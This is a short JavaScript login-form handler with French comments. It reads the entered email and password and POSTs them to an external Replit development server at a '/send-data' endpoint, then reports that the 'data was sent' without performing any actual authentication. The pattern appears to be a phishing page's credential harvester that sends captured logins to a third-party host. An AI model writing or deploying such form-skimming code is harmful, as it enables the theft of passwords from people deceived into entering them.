// Capture la soumission du formulaire
document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault(); // Empêche le rechargement de la page

    // Récupérez les valeurs des champs de formulaire
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // URL de votre serveur backend sur Replit
    const backendUrl = 'https://384e1a1e-ea8b-477e-8a3b-50e8e6878f91-00-2br30b8q94s8m.spock.replit.dev/send-data';

    // Envoyer les données au backend via une requête POST
    try {
        const response = await fetch(backendUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ email, password })
        });
        const result = await response.json();

        if (result.success) {
            alert('Données envoyées avec succès');
        } else {
            alert('Une erreur est survenue');
        }
    } catch (error) {
        console.error('Erreur lors de l\'envoi au backend:', error);
        alert('Une erreur est survenue');
    }
});
